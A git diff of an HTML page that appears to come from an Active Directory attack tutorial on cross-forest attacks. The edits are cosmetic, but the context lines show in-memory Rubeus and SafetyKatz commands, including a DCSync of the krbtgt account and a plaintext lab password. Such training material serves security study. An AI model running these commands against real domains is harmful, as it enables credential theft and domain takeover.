@@ -312,7 +312,7 @@ We must should remember that we will be using Loader.exe to run Rubeus in the me
 
 <p>Let’s now run Rubeus in memory using our .Net loader.
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:storagesvc /password:Qwerty@123 /domain:eu.local
-<pre><code>   ______        _
+<pre><code class="language-bash">   ______        _
   (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
   |  __  /| | | |  _ \| ___ | | | |/___)
@@ -349,7 +349,7 @@ Now we can use our SafetyKatz for the DCSync attack, but just before that, we sh
 
 Let’s now run SafetyKatz  in memory using our .Net loader.
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:eu\krbtgt /domain:eu.local" "exit"
-<pre><code><strong> SAM ACCOUNT </strong>
+<pre><code class="language-bash"><strong> SAM ACCOUNT </strong>
 
 <p>SAM Username         : krbtgt
 Account Type         : 30000000 ( USER_OBJECT )
@@ -455,7 +455,7 @@ Here’s a table of services that can be forged for Kerberos tickets along with 
 
 
 
-          <div class="part-navigation">
+<div class="part-navigation">
             <a href="part-26-cross-forest-attacks-kerberoast-attack.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Cross Forest Attacks - Kerbero</a>
             <a href="part-28-cross-forest-attacks-unconstrained-delegation.html">Next: Cross Forest Attacks - Unconst <ion-icon name="arrow-forward-outline"></ion-icon></a>
           </div>
